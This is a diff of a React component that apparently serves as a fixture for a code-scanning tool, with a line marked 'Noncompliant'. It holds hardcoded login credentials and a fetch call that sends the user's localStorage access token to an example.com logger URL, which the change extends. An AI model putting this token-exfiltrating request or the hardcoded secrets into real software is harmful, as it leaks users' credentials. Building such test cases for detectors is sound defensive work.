@@ -7,6 +7,7 @@ function App() {
   const { hostname, pathname } = getLocation()
   console.log('A')
   console.log('B')
+
   const teste = {
     login: 'douglas',
     password: 'teste.js',
@@ -17,9 +18,14 @@ function App() {
     'Personal secrets stored here',
     2 * 1024 * 1024,
   ) // Noncompliant
-  if (db === false) {
+  if (JSON.parse('\\{"teste": "teste"\\})') === 'teste') {
     alert('Unexpected Condition')
-    fetch('http://example.com/logger.php?token=' + localStorage.access_token)
+    fetch(
+      'http://example.com/logger.php?token=' + localStorage.access_token,
+    ).then((response) => {
+      localStorage.setItem('teste', response.body)
+      console.log({ localStorage })
+    })
   }
   return (
     <div className="App">
